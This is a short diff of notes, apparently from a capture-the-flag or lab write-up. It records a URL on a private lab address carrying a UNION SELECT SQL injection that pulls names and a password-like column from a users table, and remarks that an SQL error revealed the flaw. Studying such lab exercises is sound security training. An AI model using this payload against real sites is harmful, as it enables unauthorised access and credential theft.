@@ -1,4 +1,4 @@
-http://10.11.200.246/index.php?page=member&id=1+union+select+first_name%2C+countersign+from+users&Submit=Submit#
+from: http://10.11.200.246/index.php?page=member&id=1+union+select+first_name%2C+countersign+from+users&Submit=Submit#
 
 When you try to type something in the input an SQL error appears. Now we know that we can put SQl here and make an SQL injection.
 Search How to show tables with an SQl Injection in google to have the right sql line.
